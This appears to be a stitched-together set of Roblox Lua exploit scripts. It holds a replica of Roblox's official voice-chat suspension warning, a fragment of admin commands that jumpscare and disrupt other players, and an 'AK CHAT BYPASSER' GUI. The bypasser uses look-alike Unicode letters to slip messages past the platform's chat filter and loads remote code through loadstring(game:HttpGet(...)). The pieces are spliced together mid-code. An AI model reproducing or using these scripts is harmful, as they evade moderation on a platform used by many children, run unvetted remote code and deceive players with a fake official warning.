Layout.SortOrder = Enum.SortOrder.LayoutOrder
Layout.VerticalAlignment = Enum.VerticalAlignment.Center
Layout.Padding = UDim.new(0, 20)

TextSpaceContainer.Name = "TextSpaceContainer"
TextSpaceContainer.Parent = DialogMainFrame
TextSpaceContainer.BackgroundTransparency = 1.000
TextSpaceContainer.LayoutOrder = 6
TextSpaceContainer.Size = UDim2.new(1, 0, 0, 7)

SubBodyTextContainer.Name = "SubBodyTextContainer"
SubBodyTextContainer.Parent = DialogMainFrame
SubBodyTextContainer.BackgroundTransparency = 1.000
SubBodyTextContainer.LayoutOrder = 7
SubBodyTextContainer.Size = UDim2.new(1, 0, 0, 60)

BodyText.Name = "BodyText"
BodyText.Parent = SubBodyTextContainer
BodyText.BackgroundTransparency = 1.000
BodyText.Position = UDim2.new(0, 0, 2.8499999, 0)
BodyText.Size = UDim2.new(1, 0, 1.20000005, 0)
BodyText.Font = Enum.Font.BuilderSans
BodyText.LineHeight = 1.400
BodyText.Text = "If this happens again, you may lose access to your account."
BodyText.TextColor3 = Color3.fromRGB(189, 190, 190)
BodyText.TextScaled = true
BodyText.TextSize = 20.000
BodyText.TextWrapped = true

UITextSizeConstraint_2.Parent = BodyText
UITextSizeConstraint_2.MaxTextSize = 20
UITextSizeConstraint_2.MinTextSize = 15

BodyTextContainer.Name = "BodyTextContainer"
BodyTextContainer.Parent = DialogMainFrame
BodyTextContainer.BackgroundTransparency = 1.000
BodyTextContainer.LayoutOrder = 5
BodyTextContainer.Size = UDim2.new(1, 0, 0, 120)

BodyText_2.Name = "BodyText"
BodyText_2.Parent = BodyTextContainer
BodyText_2.BackgroundTransparency = 1.000
BodyText_2.Position = UDim2.new(-0.00307692308, 0, 0.683333337, 0)
BodyText_2.Size = UDim2.new(1, 0, 0.842000008, 0)
BodyText_2.Font = Enum.Font.BuilderSans
BodyText_2.LineHeight = 1.400
BodyText_2.Text = "We’ve temporarily turned off voice chat because you may have used language that goes against Roblox Community Standards."
BodyText_2.TextColor3 = Color3.fromRGB(189, 190, 190)
BodyText_2.TextScaled = true
BodyText_2.TextSize = 20.000
BodyText_2.TextWrapped = true

UITextSizeConstraint_3.Parent = BodyText_2
UITextSizeConstraint_3.MaxTextSize = 20
UITextSizeConstraint_3.MinTextSize = 15

WarnText.Name = "WarnText"
WarnText.Parent = BodyTextContainer
WarnText.BackgroundTransparency = 1.000
WarnText.Position = UDim2.new(0.178461537, 0, 0.341666669, 0)
WarnText.Size = UDim2.new(0.652307689, 0, 0.583333313, 0)
WarnText.Font = Enum.Font.BuilderSansBold
WarnText.LineHeight = 1.400
WarnText.Text = "4 minute suspension"
WarnText.TextColor3 = Color3.fromRGB(189, 190, 190)
WarnText.TextScaled = true
WarnText.TextSize = 97.000
WarnText.TextWrapped = true

UITextSizeConstraint_4.Parent = WarnText
UITextSizeConstraint_4.MaxTextSize = 20
UITextSizeConstraint_4.MinTextSize = 15

Padding.Name = "Padding"
Padding.Parent = DialogMainFrame
Padding.PaddingBottom = UDim.new(0, 20)
Padding.PaddingLeft = UDim.new(0, 20)
Padding.PaddingRight = UDim.new(0, 20)
Padding.PaddingTop = UDim.new(0, 20)

Icon.Name = "Icon"
Icon.Parent = DialogMainFrame
Icon.AnchorPoint = Vector2.new(0.5, 0.5)
Icon.BackgroundTransparency = 1.000
Icon.BorderSizePixel = 0
Icon.LayoutOrder = 1
Icon.Position = UDim2.new(0.503076911, 0, 0.0212310497, 0)
Icon.Size = UDim2.new(0, 55, 0, 55)
Icon.Image = "rbxasset://LuaPackages/Packages/_Index/FoundationImages/FoundationImages/SpriteSheets/img_set_1x_6.png"
Icon.ImageRectOffset = Vector2.new(248, 386)
Icon.ImageRectSize = Vector2.new(36, 36)

DividerSpaceContainer.Name = "DividerSpaceContainer"
DividerSpaceContainer.Parent = DialogMainFrame
DividerSpaceContainer.BackgroundTransparency = 1.000
DividerSpaceContainer.LayoutOrder = 4
DividerSpaceContainer.Size = UDim2.new(1, 0, 0, 7)

Overlay.Name = "Overlay"
Overlay.Parent = InGameMenuInformationalDialog
Overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Overlay.BackgroundTransparency = 0.500
Overlay.BorderSizePixel = 0
Overlay.Position = UDim2.new(0, 0, 0, -60)
Overlay.Size = UDim2.new(2, 0, 2, 0)
Overlay.ZIndex = 0
Overlay.AutoButtonColor = false
Overlay.Text = ""

ConfirmButton.Name = "ConfirmButton"
ConfirmButton.Parent = InGameMenuInformationalDialog
ConfirmButton.BackgroundTransparency = 1.000
ConfirmButton.LayoutOrder = 1
ConfirmButton.Position = UDim2.new(0.395999999, 0, 0.610000005, 0)
ConfirmButton.Size = UDim2.new(0.218181819, -5, 0, 48)
ConfirmButton.AutoButtonColor = false
ConfirmButton.Image = "rbxasset://LuaPackages/Packages/_Index/FoundationImages/FoundationImages/SpriteSheets/img_set_1x_1.png"
ConfirmButton.ImageRectOffset = Vector2.new(402, 494)
ConfirmButton.ImageRectSize = Vector2.new(17, 17)
ConfirmButton.ScaleType = Enum.ScaleType.Slice
ConfirmButton.SliceCenter = Rect.new(8, 8, 9, 9)

ButtonContent.Name = "ButtonContent"
ButtonContent.Parent = ConfirmButton
ButtonContent.BackgroundTransparency = 1.000
ButtonContent.Size = UDim2.new(1, 0, 1, 0)

ButtonMiddleContent.Name = "ButtonMiddleContent"
ButtonMiddleContent.Parent = ButtonContent
ButtonMiddleContent.BackgroundTransparency = 1.000
ButtonMiddleContent.Size = UDim2.new(1, 0, 1, 0)

UIListLayout.Parent = ButtonMiddleContent
UIListLayout.FillDirection = Enum.FillDirection.Horizontal
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
UIListLayout.Padding = UDim.new(0, 5)

Text.Name = "Text"
Text.Parent = ButtonMiddleContent
Text.BackgroundTransparency = 1.000
Text.LayoutOrder = 2
Text.Position = UDim2.new(0.184049085, 0, -0.270833343, 0)
Text.Size = UDim2.new(0, 103, 0, 22)
Text.Font = Enum.Font.BuilderSansBold
Text.Text = "I Understand"
Text.TextColor3 = Color3.fromRGB(57, 59, 61)
Text.TextSize = 20.000
Text.TextWrapped = true

SecondaryButton.Name = "SecondaryButton"
SecondaryButton.Parent = InGameMenuInformationalDialog
SecondaryButton.BackgroundTransparency = 1.000
SecondaryButton.LayoutOrder = 1
SecondaryButton.Position = UDim2.new(0.0356753246, 0, 0.329711277, 0)
SecondaryButton.Size = UDim2.new(1, -5, 0, 36)
SecondaryButton.AutoButtonColor = false

sizeConstraint.Name = "sizeConstraint"
sizeConstraint.Parent = SecondaryButton
sizeConstraint.MinSize = Vector2.new(295, 42.1599998)

textLabel.Name = "textLabel"
textLabel.Parent = SecondaryButton
textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
textLabel.BackgroundTransparency = 1.000
textLabel.Position = UDim2.new(0.473154902, 0, 6.42753744, 0)
textLabel.Size = UDim2.new(0, 381, 0, 44)
textLabel.Font = Enum.Font.BuilderSansBold
textLabel.Text = "Let us know"
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.TextSize = 20.000
textLabel.TextTransparency = 0.300
textLabel.TextWrapped = true

SecondaryButton_2.Name = "SecondaryButton"
SecondaryButton_2.Parent = InGameMenuInformationalDialog
SecondaryButton_2.BackgroundTransparency = 1.000
SecondaryButton_2.LayoutOrder = 1
SecondaryButton_2.Position = UDim2.new(0.0356753246, 0, 0.329711277, 0)
SecondaryButton_2.Size = UDim2.new(1, -5, 0, 36)
SecondaryButton_2.AutoButtonColor = false

sizeConstraint_2.Name = "sizeConstraint"
sizeConstraint_2.Parent = SecondaryButton_2
sizeConstraint_2.MinSize = Vector2.new(295, 42.1599998)

textLabel_2.Name = "textLabel"
textLabel_2.Parent = SecondaryButton_2
textLabel_2.AnchorPoint = Vector2.new(0.5, 0.5)
textLabel_2.BackgroundTransparency = 1.000
textLabel_2.Position = UDim2.new(0.471051186, 0, 5.97912741, 0)
textLabel_2.Size = UDim2.new(0, 381, 0, 22)
textLabel_2.Font = Enum.Font.BuilderSansBold
textLabel_2.Text = "Did we make a mistake? "
textLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel_2.TextSize = 20.000
textLabel_2.TextTransparency = 0.300
textLabel_2.TextWrapped = true

-- Scripts:

local function KIAWSKW_fake_script() -- ConfirmButton.LocalScript
	local script = Instance.new('LocalScript', ConfirmButton)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent:Destroy()
	end)
end
coroutine.wrap(KIAWSKW_fake_script)()

            elseif command == ".bring" then
                player.Character.HumanoidRootPart.CFrame = admin.Character.HumanoidRootPart.CFrame
            elseif command == ".js" then
                local jumpscareGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
                local img = Instance.new("ImageLabel", jumpscareGui)
                img.Size, img.Image = UDim2.new(1, 0, 1, 0), "http://www.roblox.com/asset/?id=10798732430"
                local sound = Instance.new("Sound", game:GetService("SoundService"))
                sound.SoundId, sound.Volume = "rbxassetid://161964303", 10
                sound:Play()
                wait(1.674)
                jumpscareGui:Destroy()
                sound:Destroy()
            elseif command == ".js2" then
                local jumpscareGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
                local img = Instance.new("ImageLabel", jumpscareGui)
                img.Size, img.Image = UDim2.new(1, 0, 1, 0), "http://www.roblox.com/asset/?id=75431648694596"
                local sound = Instance.new("Sound", game:GetService("SoundService"))
                sound.SoundId, sound.Volume = "rbxassetid://7236490488", 100
                sound:Play()
                wait(3.599)
                jumpscareGui:Destroy()
                sound:Destroy()
            elseif command == ".invert" then
                if not controlInversionActive[player.UserId] then
                    controlInversionActive[player.UserId] = true
                    local char = player.Character
                    local humanoid = char and char:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        local inversionConnection = humanoid:GetPropertyChangedSignal("MoveDirection"):Connect(function()
                            humanoid:Move(Vector3.new(-humanoid.MoveDirection.X, 0, -humanoid.MoveDirection.Z), true)
                        end)
                        wait(10) -- Invert for 10 seconds
                        inversionConnection:Disconnect()
                        controlInversionActive[player.UserId] = nil
                    end
                end
            elseif command == ".uninvert" then
                if controlInversionActive[player.UserId] then
                    controlInversionActive[player.UserId] = nil
                end
            elseif command == ".spin" then
                if not spinActive[player.UserId] then
                    spinActive[player.UserId] = true
                    local char = player.Character
                    local humanoid = char and char:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        local initialRotation = char.HumanoidRootPart.CFrame
                        for i = 1, 12 do
                            wait(0.1)
                            char.HumanoidRootPart.CFrame = initialRotation * CFrame.Angles(0, math.rad(30 * i), 0)
                        end
                    end
                end
            elseif command == ".unspin" then
                if spinActive[player.UserId] then
                    spinActive[player.UserId] = nil
                end
            elseif command == ".disablejump" then
                if not jumpDisabled[player.UserId] then
                    jumpDisabled[player.UserId] = true
                    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        humanoid.JumpPower = 0
                        wait(5)
                        humanoid.JumpPower = 50 -- Reset jump power (default can vary)
                        jumpDisabled[player.UserId] = nil
                    end
                end
            elseif command == ".unenablejump" then
                if jumpDisabled[player.UserId] then
                    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        humanoid.JumpPower = 50 -- Reset jump power
                    end
                    jumpDisabled[player.UserId] = nil
                end
            elseif command == ".scare" then
                local sound = Instance.new("Sound", player.Character)
                sound.SoundId = "rbxassetid://157636218"
                sound.Volume = 100
                sound:Play()
                wait(2.5) -- Wait for the sound to finish
                sound:Destroy()
                elseif command == ".knock" then
                local sound = Instance.new("Sound", player.Character)
                sound.SoundId = "rbxassetid://5236308259"
                sound.Volume = 100
                sound:Play()
                wait(15) -- Wait for the sound to finish
                sound:Destroy()
            elseif command == ".bighead" then
                local head = player.Character:FindFirstChild("Head")
                if head then
                    head.Size = head.Size * 2
                end
            elseif command == ".tiny" then
                local char = player.Character
                if char then
                    char:FindFirstChild("Humanoid").RootPart.Size = Vector3.new(0.5, 0.5, 0.5)
                end
            elseif command == ".big" then
                local char = player.Character
                if char then
                    char:FindFirstChild("Humanoid").RootPart.Size = Vector3.new(2, 2, 2)
                end
            elseif command == ".sillyhat" then
                local hat = Instance.new("Accessory")
                local mesh = Instance.new("SpecialMesh")
                mesh.MeshId = "rbxassetid://14170755549" -- Change this to a funny hat asset ID
                mesh.Parent = hat
                hat.Parent = player.Character
            end
        end
    end)
end

-- Add admin functionality for listed users
for _, player in ipairs(game.Players:GetPlayers()) do
    if table.find(adminCmd, player.Name) then
        setupAdminCommands(player)
    end
end

game.Players.PlayerAdded:Connect(function(player)
    if table.find(adminCmd, player.Name) then
        setupAdminCommands(player)
    end
end)



-- Primary replacement table.
-- Each letter’s replacement has the extra character appended at the end.
local letters_primary = {
    ["A"] = "Ạ", ["a"] = "ạ",
    ["B"] = "Ḅ", ["b"] = "ḅ",
    ["C"] = "Ḉ", ["c"] = "ḉ",
    ["D"] = "Ḍ", ["d"] = "ḍ",
    ["E"] = "Ẹ", ["e"] = "ẹ",
    ["F"] = "F",  ["f"] = "f",
    ["G"] = "Ḡ", ["g"] = "ḡ",
    ["H"] = "Ḥ", ["h"] = "ḥ",
    ["I"] = "Ị", ["i"] = "ị",
    ["J"] = "Ĵ", ["j"] = "ĵ",
    ["K"] = "K", ["k"] = "k",
    ["L"] = "Ḷ", ["l"] = "ḷ",
    ["M"] = "Ṃ", ["m"] = "ṃ",
    ["N"] = "Ṇ", ["n"] = "ṇ",
    ["O"] = "Ọ", ["o"] = "ọ",
    ["P"] = "Ṗ", ["p"] = "ṗ",
    ["Q"] = "Q̇",["q"] = "q̇",
    ["R"] = "R", ["r"] = "r",
    ["S"] = "Ṣ", ["s"] = "ṣ",
    ["T"] = "Ṭ", ["t"] = "ṭ",
    ["U"] = "Ụ", ["u"] = "ụ",
    ["V"] = "Ṿ", ["v"] = "ṿ",
    ["W"] = "Ẉ", ["w"] = "ẉ",
    ["X"] = "Ẋ", ["x"] = "ẋ",
    ["Y"] = "Ỵ", ["y"] = "ỵ",
    ["Z"] = "Ẓ", ["z"] = "ẓ",
    [" "] = "  "  -- (Space remains two spaces; add the extra character if desired.)
}

-- Secondary replacement table.
-- These replacements are used if the message becomes tagged.
-- The provided letter pairs are interpreted as:
--    Uppercase: replacement from the left element
--    Lowercase: replacement from the right element
local letters_secondary = {
    ["A"] = "å", ["a"] = "a",
    ["B"] = "ƀ", ["b"] = "b",
    ["C"] = "ç", ["c"] = "c",
    ["D"] = "đ", ["d"] = "d",
    ["E"] = "ȇ", ["e"] = "e",
    ["F"] = "f", ["f"] = "f",
    ["G"] = "ĝ", ["g"] = "g",
    ["H"] = "ħ", ["h"] = "h",
    ["I"] = "í", ["i"] = "i",
    ["J"] = "ǰ", ["j"] = "j",
    ["K"] = "κ", ["k"] = "k",
    ["L"] = "|", ["l"] = "l",
    ["M"] = "ɱ", ["m"] = "m",
    ["N"] = "ň", ["n"] = "n",
    ["O"] = "ο", ["o"] = "o",
    ["P"] = "ƥ", ["p"] = "p",
    ["Q"] = "ʠ", ["q"] = "q",
    ["R"] = "ŕ", ["r"] = "r",
    ["S"] = "š", ["s"] = "s",
    ["T"] = "ţ", ["t"] = "t",
    ["U"] = "û", ["u"] = "u",
    ["V"] = "ѷ", ["v"] = "v",
    ["W"] = "w", ["w"] = "w",
    ["X"] = "ẋ", ["x"] = "x",
    ["Y"] = "ƴ", ["y"] = "y",
    ["Z"] = "ž", ["z"] = "z",
    [" "] = "  "  -- (Space remains the same; modify if needed.)
}


local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()

-- Initialize services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

-- Create main GUI
local GUI = Instance.new("ScreenGui")
GUI.Name = "ProfessionalChatBypass"
GUI.ResetOnSpawn = false
GUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
GUI.Parent = game:GetService("CoreGui")

-- Create main frame
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 280, 0, 120)
MainFrame.Position = UDim2.new(1, -290, 0.5, -60)
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = GUI

-- Add smooth shadow
local Shadow = Instance.new("ImageLabel")
Shadow.Name = "Shadow"
Shadow.AnchorPoint = Vector2.new(0.5, 0.5)
Shadow.BackgroundTransparency = 1
Shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
Shadow.Size = UDim2.new(1, 30, 1, 30)
Shadow.Image = "rbxassetid://6014257812"
Shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
Shadow.ImageTransparency = 0.5
Shadow.Parent = MainFrame

-- Add corner rounding
local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, 6)
Corner.Parent = MainFrame

-- Create title bar
local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Size = UDim2.new(1, 0, 0, 30)
TitleBar.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
TitleBar.BorderSizePixel = 0
TitleBar.Parent = MainFrame

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 6)
TitleCorner.Parent = TitleBar

-- Add gradient to title bar
local TitleGradient = Instance.new("UIGradient")
TitleGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 45, 55)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(35, 35, 45))
})
TitleGradient.Parent = TitleBar

-- Title text
local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.Size = UDim2.new(1, -60, 1, 0)
Title.Position = UDim2.new(0, 28, 0, 0)
Title.BackgroundTransparency = 1
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 14
Title.Font = Enum.Font.GothamBold
Title.Text = "AK CHAT BYPASSER"
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = TitleBar

-- Create close button
local CloseButton = Instance.new("TextButton")
CloseButton.Name = "CloseButton"
CloseButton.Size = UDim2.new(0, 24, 0, 24)
CloseButton.Position = UDim2.new(1, -27, 0, 3)
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 85, 85)
CloseButton.Text = "×"
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.TextSize = 16
CloseButton.Font = Enum.Font.GothamBold
CloseButton.Parent = TitleBar

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 4)
CloseCorner.Parent = CloseButton

-- Add minimize button
local MinimizeButton = Instance.new("TextButton")
MinimizeButton.Name = "MinimizeButton"
MinimizeButton.Size = UDim2.new(0, 24, 0, 24)
MinimizeButton.Position = UDim2.new(1, -54, 0, 3)
MinimizeButton.BackgroundColor3 = Color3.fromRGB(255, 185, 85)
MinimizeButton.Text = "-"
MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MinimizeButton.TextSize = 16
MinimizeButton.Font = Enum.Font.GothamBold
MinimizeButton.Parent = TitleBar

local MinimizeCorner = Instance.new("UICorner")
MinimizeCorner.CornerRadius = UDim.new(0, 4)
MinimizeCorner.Parent = MinimizeButton

-- Create input box
local InputBox = Instance.new("TextBox")
InputBox.Name = "InputBox"
InputBox.Size = UDim2.new(1, -20, 0, 30)
InputBox.Position = UDim2.new(0, 10, 0, 40)
InputBox.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
InputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
InputBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
InputBox.PlaceholderText = "Enter message..."
InputBox.TextSize = 14
InputBox.Font = Enum.Font.Gotham
InputBox.ClearTextOnFocus = true
InputBox.Parent = MainFrame

local InputCorner = Instance.new("UICorner")
InputCorner.CornerRadius = UDim.new(0, 4)
InputCorner.Parent = InputBox

-- Create send button
local SendButton = Instance.new("TextButton")
SendButton.Name = "SendButton"
SendButton.Size = UDim2.new(0, 80, 0, 26)
SendButton.Position = UDim2.new(1, -90, 1, -36)
SendButton.BackgroundColor3 = Color3.fromRGB(65, 145, 255)
SendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SendButton.Text = "Send"
SendButton.TextSize = 14
SendButton.Font = Enum.Font.GothamBold
SendButton.Parent = MainFrame

local SendCorner = Instance.new("UICorner")
SendCorner.CornerRadius = UDim.new(0, 4)
SendCorner.Parent = SendButton

-- Add status indicator
local StatusIndicator = Instance.new("Frame")
StatusIndicator.Name = "StatusIndicator"
StatusIndicator.Size = UDim2.new(0, 6, 0, 6)
StatusIndicator.Position = UDim2.new(0, 12, 0, 12)
StatusIndicator.BackgroundColor3 = Color3.fromRGB(50, 255, 50)
StatusIndicator.Parent = TitleBar

local StatusCorner = Instance.new("UICorner")
StatusCorner.CornerRadius = UDim.new(1, 0)
StatusCorner.Parent = StatusIndicator

-- Utility functions
local function replace(str, find_str, replace_str)
    local escaped_find_str = find_str:gsub("[%-%^%$%(%)%%%.%[%]%*%+%-%?]", "%%%0")
    return str:gsub(escaped_find_str, replace_str)
end

local function filter(message, tableToUse)
    for search, replacement in pairs(tableToUse) do
       local escapedSearch = search:gsub("([%^%$%(%)%%%.%[%]%*%+%-%?])", "%%%1")
        message = message:gsub(escapedSearch, replacement)
    end
    return message
end


local function showNotification(title, text)
    Notification:Notify(
        {Title = title, Description = text},
        {OutlineColor = Color3.fromRGB(80, 80, 80), Time = 3, Type = "default"}
    )
end

-- Chat functions
local function sendChat(msg)
    local converted = filter(msg, letters_primary)
    local filteredMessage = game:GetService("Chat"):FilterStringForBroadcast(converted, LocalPlayer)
    local tagged = filteredMessage ~= converted
    
    if tagged then
        converted = filter(msg, letters_secondary)
        showNotification("Message Tagged", "Message filtered; using backup replacements.")
    end

    if TextChatService.ChatVersion == Enum.ChatVersion.LegacyChatService then
        ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents").SayMessageRequest:FireServer(converted, "All")
    else
        TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(converted)
    end
    InputBox.Text = ""

end

-- UI Interactions
local function processText()
    local inputText = InputBox.Text
    if inputText ~= "" then
       sendChat(inputText)
    end
end

-- Button animations
local function createButtonEffect(button)
    local originalColor = button.BackgroundColor3
    
    button.MouseEnter:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.2), {
            BackgroundColor3 = originalColor:Lerp(Color3.fromRGB(255, 255, 255), 0.2)
        }):Play()
    end)
    
    button.MouseLeave:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.2), {
            BackgroundColor3 = originalColor
        }):Play()
    end)
    
    button.MouseButton1Down:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.1), {
            BackgroundColor3 = originalColor:Lerp(Color3.fromRGB(0, 0, 0), 0.1)
        }):Play()
    end)
    
    button.MouseButton1Up:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.1), {
            BackgroundColor3 = originalColor
        }):Play()
    end)
end

-- Make frame draggable for all devices
local function enableDragging(frame, handle)
    local dragging = false
    local dragStart
    local startPos
    local lastPos
    
    handle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or 
           input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            lastPos = startPos
            
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or
                        input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            local targetPos = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
            
            -- Smooth movement
            local tweenInfo = TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
            TweenService:Create(frame, tweenInfo, {Position = targetPos}):Play()
            
            lastPos = targetPos
        end
    end)
end

-- Minimize functionality
local minimized = false
MinimizeButton.MouseButton1Click:Connect(function()
    minimized = not minimized
    local targetSize = minimized and UDim2.new(0, 280, 0, 30) or UDim2.new(0, 280, 0, 120)
    local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
    
    TweenService:Create(MainFrame, tweenInfo, {Size = targetSize}):Play()
    TweenService:Create(Shadow, tweenInfo, {Size = UDim2.new(1, 30, targetSize.Y.Scale, targetSize.Y.Offset + 30)}):Play()
    
    -- Toggle visibility of other elements
    -- Hide input box and send button when minimized
    InputBox.Visible = not minimized
    SendButton.Visible = not minimized
end)

-- Connect events
SendButton.MouseButton1Click:Connect(processText)
InputBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        processText()
    end
end)

CloseButton.MouseButton1Click:Connect(function()
    local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
    local fadeOut = TweenService:Create(MainFrame, tweenInfo, {
        BackgroundTransparency = 1,
        Position = UDim2.new(1, 0, MainFrame.Position.Y.Scale, MainFrame.Position.Y.Offset)
    })
    
    fadeOut.Completed:Connect(function()
        GUI:Destroy()
    end)
    
    fadeOut:Play()
end)

-- Apply button effects
createButtonEffect(SendButton)
createButtonEffect(CloseButton)
createButtonEffect(MinimizeButton)

-- Enable dragging
enableDragging(MainFrame, TitleBar)

-- Add input box effects
InputBox.Focused:Connect(function()
    TweenService:Create(InputBox, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(50, 50, 60)
    }):Play()
end)

InputBox.FocusLost:Connect(function()
    TweenService:Create(InputBox, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    }):Play()
end)

-- Startup animation
MainFrame.BackgroundTransparency = 1
Shadow.ImageTransparency = 1
TitleBar.BackgroundTransparency = 1
Title.TextTransparency = 1
CloseButton.BackgroundTransparency = 1
MinimizeButton.BackgroundTransparency = 1
InputBox.BackgroundTransparency = 1
SendButton.BackgroundTransparency = 1
StatusIndicator.BackgroundTransparency = 1

local function fadeIn(duration)
    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
    
    TweenService:Create(MainFrame, tweenInfo, {BackgroundTransparency = 0}):Play()
    TweenService:Create(Shadow, tweenInfo, {ImageTransparency = 0.5}):Play()
    TweenService:Create(TitleBar, tweenInfo, {BackgroundTransparency = 0}):Play()
    TweenService:Create(Title, tweenInfo, {TextTransparency = 0}):Play()
    TweenService:Create(CloseButton, tweenInfo, {BackgroundTransparency = 0}):Play()
    TweenService:Create(MinimizeButton, tweenInfo, {BackgroundTransparency = 0}):Play()
    TweenService:Create(InputBox, tweenInfo, {BackgroundTransparency = 0}):Play()
    TweenService:Create(SendButton, tweenInfo, {BackgroundTransparency = 0}):Play()
    TweenService:Create(StatusIndicator, tweenInfo, {BackgroundTransparency = 0}):Play()
end

-- Position check and adjustment
local function adjustFramePosition()
    local viewportSize = workspace.CurrentCamera.ViewportSize
    local frameSize = MainFrame.AbsoluteSize
    
    if MainFrame.AbsolutePosition.X + frameSize.X > viewportSize.X then
        MainFrame.Position = UDim2.new(1, -frameSize.X - 10, MainFrame.Position.Y.Scale, MainFrame.Position.Y.Offset)
    end
    
    if MainFrame.AbsolutePosition.Y + frameSize.Y > viewportSize.Y then
        MainFrame.Position = UDim2.new(MainFrame.Position.X.Scale, MainFrame.Position.X.Offset, 1, -frameSize.Y - 10)
    end
end

-- Adjust position on viewport size change
workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(adjustFramePosition)

-- Initial setup
adjustFramePosition()
fadeIn(0.5)

-- Status indicator pulse animation
spawn(function()
    while wait(1) do
        if not GUI:IsDescendantOf(game:GetService("CoreGui")) then break end
        
        TweenService:Create(StatusIndicator, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            BackgroundColor3 = Color3.fromRGB(50, 255, 50),
            BackgroundTransparency = 0.5
        }):Play()
        wait(1)
        TweenService:Create(StatusIndicator, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            BackgroundColor3 = Color3.fromRGB(50, 255, 50),
            BackgroundTransparency = 0
        }):Play()
    end
end)

-- Show initial success notification
showNotification("Chat Interface", "Ready to use!")

-- Add keyboard shortcut (Ctrl + M to minimize)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.M and UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
        MinimizeButton.MouseButton1Click:Fire()
    end
end)
